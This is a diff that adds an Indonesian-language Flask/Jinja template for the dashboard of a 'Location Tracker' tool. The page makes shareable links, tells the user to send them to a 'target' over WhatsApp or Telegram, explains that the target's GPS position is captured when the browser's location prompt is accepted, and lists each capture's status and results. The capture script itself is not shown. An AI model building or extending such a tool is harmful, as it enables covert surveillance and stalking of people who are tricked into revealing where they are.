@@ -1,0 +1,107 @@
+{% extends "base.html" %}
+{% block title %}Location Tracker{% endblock %}
+{% block content %}
+<div class="row mb-4">
+    <div class="col-12">
+        <h2><i class="bi bi-geo-alt-fill text-danger"></i> Location Tracker</h2>
+        <p class="text-secondary">Buat link pelacak lokasi yang bisa dishare ke target via WhatsApp, Telegram, dll.</p>
+    </div>
+</div>
+
+<div class="row">
+    <div class="col-md-6 mb-4">
+        <div class="card border-danger">
+            <div class="card-body">
+                <form method="POST">
+                    <div class="mb-3">
+                        <label for="label" class="form-label">Label / Keterangan</label>
+                        <input type="text" class="form-control" id="label" name="label" placeholder="Misal: Test ke teman" required>
+                    </div>
+                    <button type="submit" class="btn btn-danger w-100">
+                        <i class="bi bi-link-45deg"></i> Buat Link Baru
+                    </button>
+                </form>
+            </div>
+        </div>
+    </div>
+
+    <div class="col-md-6 mb-4">
+        <div class="card border-secondary">
+            <div class="card-header bg-secondary text-white">
+                <i class="bi bi-info-circle"></i> Cara Kerja
+            </div>
+            <div class="card-body">
+                <ol class="mb-0 text-secondary">
+                    <li>Buat link baru dengan label</li>
+                    <li>Share link ke target via WhatsApp/Telegram/dll</li>
+                    <li>Target buka link dan browser minta izin lokasi</li>
+                    <li>Jika diizinkan, lokasi GPS akan tertangkap</li>
+                    <li>Lihat hasilnya di menu <strong>Hasil</strong></li>
+                </ol>
+            </div>
+        </div>
+    </div>
+</div>
+
+{% if tracks %}
+<div class="row">
+    <div class="col-12">
+        <div class="card border-danger">
+            <div class="card-header bg-danger text-white"><i class="bi bi-list"></i> Daftar Tracking</div>
+            <div class="card-body p-0">
+                <div class="table-responsive">
+                    <table class="table table-dark table-hover mb-0">
+                        <thead>
+                            <tr>
+                                <th>Label</th>
+                                <th>Dibuat</th>
+                                <th>Status</th>
+                                <th>Link</th>
+                                <th>Aksi</th>
+                            </tr>
+                        </thead>
+                        <tbody>
+                            {% for id, track in tracks %}
+                            <tr>
+                                <td>{{ track.label }}</td>
+                                <td><small>{{ track.created_at }}</small></td>
+                                <td>
+                                    {% if track.status == 'success' %}
+                                    <span class="badge bg-success">Berhasil</span>
+                                    {% else %}
+                                    <span class="badge bg-warning text-dark">Menunggu</span>
+                                    {% endif %}
+                                </td>
+                                <td>
+                                    <div class="d-flex align-items-center gap-1">
+                                        <code style="font-size: 0.7rem;" class="text-truncate" style="max-width: 200px;">{{ base_url }}/track/{{ id }}</code>
+                                        <button class="btn btn-sm btn-outline-light" onclick="copyLink('{{ base_url }}/track/{{ id }}')" title="Salin link">
+                                            <i class="bi bi-clipboard"></i>
+                                        </button>
+                                    </div>
+                                </td>
+                                <td>
+                                    <a href="{{ url_for('location_tracker_results', tracking_id=id) }}" class="btn btn-sm btn-outline-danger">
+                                        <i class="bi bi-eye"></i> Hasil
+                                    </a>
+                                </td>
+                            </tr>
+                            {% endfor %}
+                        </tbody>
+                    </table>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+{% endif %}
+{% endblock %}
+{% block extra_js %}
+<script>
+function copyLink(link) {
+    navigator.clipboard.writeText(link).then(function() {
+        alert('Link berhasil disalin!');
+    });
+}
+</script>
+{% endblock %}
